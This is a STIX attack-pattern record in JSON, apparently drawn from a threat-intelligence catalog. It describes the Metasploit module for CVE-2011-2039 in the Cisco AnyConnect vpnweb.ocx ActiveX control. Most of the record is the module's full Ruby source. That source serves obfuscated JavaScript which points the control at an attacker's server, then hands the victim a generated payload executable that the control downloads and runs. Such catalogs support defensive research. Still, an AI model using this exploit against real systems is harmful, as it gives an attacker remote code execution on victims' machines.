{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--22e1ae85-ed5c-449f-bd6d-d3554b2b105e",
    "created": "2024-08-14T16:41:18.329024Z",
    "modified": "2024-08-14T16:41:18.329027Z",
    "name": "Cisco AnyConnect VPN Client ActiveX URL Property Download and Execute",
    "description": " This module exploits a vulnerability in the Cisco AnyConnect VPN client vpnweb.ocx ActiveX control. This control is typically used to install the VPN client. An attacker can set the 'url' property which is where the control tries to locate the files needed to install the client.  The control tries to download two files from the site specified within the 'url' property. One of these files it will be stored in a temporary directory and executed.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/cisco_anyconnect_exec.rb",
            "external_id": "cisco_anyconnect_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2011-2039"
        },
        {
            "source_name": "reference",
            "url": "http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=909"
        },
        {
            "source_name": "reference",
            "url": "http://www.cisco.com/en/US/products/products_security_advisory09186a0080b80123.shtml"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n  include Msf::Exploit::EXE\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Cisco AnyConnect VPN Client ActiveX URL Property Download and Execute',\n      'Description'    => %q{\n          This module exploits a vulnerability in the Cisco AnyConnect VPN client\n        vpnweb.ocx ActiveX control. This control is typically used to install the\n        VPN client. An attacker can set the 'url' property which is where the control\n        tries to locate the files needed to install the client.\n\n          The control tries to download two files from the site specified within the\n        'url' property. One of these files it will be stored in a temporary directory and\n        executed.\n          },\n      'License'        => MSF_LICENSE,\n      'Author'         => [ 'bannedit' ],\n      'References'     =>\n        [\n          [ 'CVE', '2011-2039' ],\n          [ 'OSVDB', '72714'],\n          [ 'URL', 'http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=909' ],\n          [ 'URL', 'http://www.cisco.com/en/US/products/products_security_advisory09186a0080b80123.shtml'],\n        ],\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Automatic',\n              {\n                'Arch' => ARCH_X86\n              }\n          ],\n        ],\n      'DisclosureDate' => '2011-06-01',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptString.new('URIPATH', [ true, \"The URI to use.\", \"/\" ])\n      ])\n  end\n\n  def on_request_uri(cli, request)\n\n    if request.uri.match(/vpndownloader\\.exe/)\n      exe = generate_payload_exe({:code => payload.encoded})\n\n      print_status(\"Client requested: #{request.uri}. Sending vpndownloader.exe\")\n      send_response(cli, exe, { 'Content-Type' => 'application/octet-stream' })\n      select(nil, nil, nil, 5) # let the file download\n      handler(cli)\n      return\n    end\n\n    if request.uri.match(/updates\\.txt/)\n      print_status(\"Client requested: #{request.uri}. Sending updates.txt\")\n      updates = rand_text_alpha((rand(500) + 1)) + \"\\n\" + rand_text_alpha((rand(500) + 1))\n      send_response(cli, updates, { 'Content-Type' => 'text/plain' })\n      return\n    end\n\n    url = get_uri(cli)\n\n    dir = rand_text_alpha((rand(40) + 1))\n    js = ::Rex::Exploitation::JSObfu.new %Q|\n    var x = document.createElement(\"object\");\n    x.setAttribute(\"classid\", \"clsid:55963676-2F5E-4BAF-AC28-CF26AA587566\");\n    x.url = \"#{url}/#{dir}/\";\n|\n    js.obfuscate(memory_sensitive: true)\n    html = \"<html>\\n\\t<script>#{js}\\t</script>\\n</html>\"\n    print_status(\"Sending #{self.name}\")\n    send_response_html(cli, html)\n  end\nend\n",
    "x_mitre_disclosure_date": "2011-06-01",
    "x_mitre_platforms": [
        "win'"
    ]
}